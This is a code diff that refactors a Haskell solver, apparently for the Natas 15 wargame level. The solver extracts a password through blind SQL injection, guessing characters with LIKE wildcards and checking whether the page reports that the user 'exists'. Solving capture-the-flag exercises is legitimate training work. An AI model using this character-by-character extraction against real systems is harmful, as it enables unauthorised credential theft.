@@ -2,33 +2,18 @@
 
 module Natas.Natas15 where
 
-import           Control.Monad       (filterM)
+import           Data.Text    (breakOn, pack)
 
-import           Data.List           (intersperse)
-import           Data.Text           (breakOn, pack)
+import           Network.Wreq (partText)
 
-import           Control.Monad.Loops (firstM)
-import           Network.Wreq        (partText)
-
+import           Natas.Inject
 import           Natas.Natas
 
 solution :: Solution
-solution = do
-  presentChars <- filterM (attemptPassword . placeAnywhere) validChars
-  print presentChars
-  match <- buildPassword presentChars ""
-  pure $ fmap pack match
+solution = injectSolution (attemptPassword . placeAnywhereSql) buildPassword
 
 buildPassword :: String -> String -> IO (Maybe String)
-buildPassword avail curr = do
-  let placeEnd x = curr ++ pure x
-      fuzzyAttempt password = attemptPassword (password ++ "%")
-  matches <- (firstM fuzzyAttempt . fmap placeEnd) avail
-  case matches of
-    Nothing -> pure (pure curr)
-    Just match -> do
-      print match
-      buildPassword avail match
+buildPassword = buildPassword' (attemptPassword . (++ "%"))
 
 attemptPassword :: String -> IO Bool
 attemptPassword guess = do
@@ -42,9 +27,3 @@ attemptPassword guess = do
     case breakOn "exists" body of
       (_match, "") -> False
       _tupmatch    -> True
-
-placeAnywhere :: Char -> String
-placeAnywhere x = intersperse x "%%"
-
-validChars :: String
-validChars = ['0' .. '9'] ++ ['A' .. 'Z'] ++ ['a' .. 'z']
